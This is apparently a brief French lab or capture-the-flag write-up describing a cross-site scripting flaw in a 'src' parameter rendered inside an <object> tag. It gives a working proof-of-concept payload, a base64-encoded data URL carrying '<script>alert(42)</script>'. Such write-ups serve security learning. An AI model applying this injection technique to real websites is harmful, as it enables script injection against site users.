EXPLAIN: /index.php?page=media&src=nsa

On a 2 arguments;
page : arguments habituel
src  : <object>
		On voit que l'image de l'aigle est contenu dans un balise <object> et non <img>

- Lorsque l'on met '?' en value de src on voit qu'il nous genere une miniature de la page d'acceuil du site. 
- Lorsque l'on met une image quelconque d;internet on voit qu'elle est bien rentree dans le DOM, mais pas affichee.

Envoyer un script.

https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs
https://www.base64encode.org/ encode <script>alert(42)</script>

data:[<mediatype>][;base64],<data>

data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
